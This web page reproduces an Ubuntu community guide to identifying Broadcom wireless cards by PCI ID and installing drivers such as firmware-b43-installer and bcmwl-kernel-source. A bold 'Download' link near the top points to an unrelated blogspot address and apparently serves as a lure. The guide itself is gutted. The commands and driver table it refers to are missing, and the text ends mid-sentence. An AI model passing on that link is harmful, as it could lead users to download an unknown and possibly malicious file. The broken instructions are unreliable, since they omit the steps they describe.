
 
This answer is based on an extensive research done by various Ubuntu users that worked together in almost all issues related to Broadcom. Special thanks to chili555 who helped in the Ubuntu forums and on this site with many questions related to Wireless devices and to others who have contributed through E-Mail, chats, IRC and more in testing various drivers with several of the most popular Broadcom Wireless cards (Huge Thanks to Chili555 really. This guy knows his stuff).
 
**Download ••• [https://passrogmisslo.blogspot.com/?file=2A0Pd3](https://passrogmisslo.blogspot.com/?file=2A0Pd3)**


 
In total we wanted to offer an answer that could be easy to follow and covered most Broadcom Cards / Drivers. After you follow this guide, you will **NEED** to test your wireless connection for at least 2 hours (I actually recommend 8 hours) with another device in either Ad-Hoc Mode, Infrastructure Mode or Both. Common problems that will be solved (Apart from drivers not installing) are:
 
There are dozens of Broadcom wireless cards and more seem to appear every day. The key to finding the correct driver for any network card is what is known as the **PCI ID** (PCI.ID). To find out which PCI.ID you have, we proceed to opening the terminal by pressing CTRL+ALT+T (It should open a window with a blank background) and inside this terminal we run the following command:
 
The PCI.ID in this example is **14e4:4320** as seen inside the Brackets [...]. In some cases you will also need the revision version (if it appears) for some special cases. In this case, the revision version is **rev 03** as shown inside the Parentheses (...) at the end. So what you will need after this search is:

With this new information you can look in the table below and select the appropriate method to install your driver. For example, In this case, since you have the **14e4:4320 rev 03**, if we go down the list to the one that shows the exact same PCI.ID you will see that in the columns for Ubuntu 18.04 or 20.04 it shows the firmware-b43-installer package driver. This means that you will only have to install this particular package since it appears in all Ubuntu version columns.
 
**NOTE** - Before proceeding, if you have previously installed any drivers, have blacklisted or uncommented any driver files or configuration files or have done any changes whatsoever to the system to make the drivers work in previous attempts, you will need to undo them in order to follow this guide. We assume you are doing this from scratch and have not changed any configuration files, modules or drivers in the system in any way (apart from updating the system). This includes any installations using apt-get, aptitude, synaptic, dpkg, software center or manual compilation and installation of the packages. The system has to start from scratch in order for this to work and to avoid any conflicts that may appear if earlier work was done.
 
Now using the PCI.ID you found in the steps above, we then search in the list below to find the matching PCI.ID and the method to install the driver associated with it in a simple and correct way. The terminal will be used to avoid any GUI related issues. This applies with all cases, except as noted. The installation procedure is done only via terminal and also while connected to the internet with a temporary wired ethernet connection or USB modem or any means possible that can give your PC, for the time, Internet access. After you find in the list below the correct package we then proceed with the installation.
 
Assuming you used the PCI.ID **14e4:4320 rev 03** as found in your search above, and then looked at the table below and found that the correct package to install is the firmware-b43-installer (Specific to Broadcom) and the linux-firmware (Carries over Broadcom related drivers along with other types of drivers), we then proceed to simply install this package in the terminal:
 
For All cases, always install the linux-firmware package if it is an option on the table above for that particular Broadcom Card. This will always be up-to-date with the latest Broadcom drivers along with other binary files that could be needed depending on the driver PCIID.
 
In hardware like the Lenovo S10-2, if your wireless card gets stuck trying to connect to an SSID (keeps trying to connect), then the alternative to get it working would be to install the bcmwl-kernel-source package (Remove any other installed packages related to it). Read the Debugging section below for more information regarding this wireless device.
 
**IMPORTANT NOTE** - After September 2014, if you follow this answer and still you have problems installing the correct driver, please try the firmware-b43-installer package and the linux-firmware package and notify us via comments. There were some changes and some drivers will only work with this package. Remember to have a clean system before installing it:
 
To give an example, after going to point 1 mentioned above, If you had theBroadcom 14e4:43a0, you would search for the bcmwl-kernel-source package and after selecting the corresponding Ubuntu version (In my case 16.04 or Xenial) I would land on the following page:
 
In some computers, before performing the commands, you will need to deactivate the Secure Boot Options in your BIOS. This applies for cases, for example, where the bcmwl-kernel-source is already installed but the driver does not yet work. You can do a reinstall like so, or disable Secure Boot by going to your BIOS Setup:
 
The following information is additional material to read about solving various issues related to Wireless Management and conflicts with other Network devices. Know that it some cases you need to have an updated Kernel version, since each new version of the Kernel introduces either new Network drivers, improvements over existing drivers or solves bugs regarding them.
 
Before reading the points mentioned below, be sure to have all repositories enabled on your Ubuntu system. To check, run on the terminal software-properties-gtk and make sure all options on the Ubuntu Software Tab are enabled.
 
If your connection drops every so often some users have suggested to set IPv6 to **Ignore**. Just go to Network Manager (The network icon on the top panel). Click on it then select **Edit Settings**. Then go to the Wireless connection you are using, select it. Now go to the last Tab in there that mentions **IPv6 Settings**. In the Method field select **Ignore**.
 
If your laptop does not detect your wireless card some users have mentioned that using rfkill unblock all will solve the problem. Others simply turned the WiFi switch on their laptops off and then on again (Physical switch available on this laptops). For more information about rfkill please read rf kill unblock all DOES NOT WORK!
 
For all Wireless cards in general, it is very important to also take into consideration the network devices you are using (Routers, Switches, Wireless Channels and Wireless Bands, etc..). With this information you will be able to evaluate better what the source of the problem could be when you arrive at a dead end. An example would be the Lenovo S10-2 which uses the **14e4:4315 rev 01** PCIID. Even after installing the correct driver the user would end up in a "trying to connect" loop. It would see the wireless SSID but when trying to connect to it, it would enter an reconnecting loop.
 
The solution was that this particular wireless device did not support 40 Mhz channels nor does it support 802.11N. The router in that case was actually broadcasting with a forced 40 Mhz and on WiFi-N only. When the router was set to Auto mode and 20/40 Mhz Channel, the wireless card worked correctly. This is a case scenario that also repeats in other cases, so a proper evaluation of the network equipment would help a lot.
 
when doing a dmesg and your wireless connection drops often (Several times an hour or a day), the issue here might be that you are inside a wireless signal that is used as a Wireless Bridge (2 Routers sharing the same SSID and connection). This can happen with modern Routers that have the ability to extend the wireless connection by offering the same SSID. your wireless connection might drop because you might be between both routers and the signal strength between both is almost the same.
 
If your connection drops very often, it means you are almost in the middle of both router devices. To lower or eliminate the dropping rate of your wireless device, try to position yourself where your wireless card can see only one router or at least one of the routers has a higher signal strength than the other one.
 
There are also some techniques to force the wireless device to only connect to a specific router by setting the BSSID to the MAC Address of the router you wish to connect to. This will force your wireless device to ONLY connect to it.
 
This is because the access needed is denied by Secure Boot so the drivers will look like they are installed correctly when in fact the did not. So for VERY specific cases, you will need to temporarily disable Secure Boot in order for the drivers to work.
 
On other cases looking for and installing the latest Linux Firmware would solve the issue. Either solving minor problems that were happening with a working card or making the card work for the first time.
 
If you're not running Natty or Oneiric, your kernel probably won't have this driver. You need to be running at least 2.6.27 and I'd recommend 2.6.28 as the bare minimum (you can check what you're on by running uname -r).
 
If you're behind on versions, I'd suggest the upgrade but for a quick fix, you can take a look at the mainline kernels and try one of those. Installing kernel packages is rarely a risky thing because you can usually just fall back to an old one using the grub boot screen.
 
If you're not seeing that, something else has been loaded in and you need to blacklist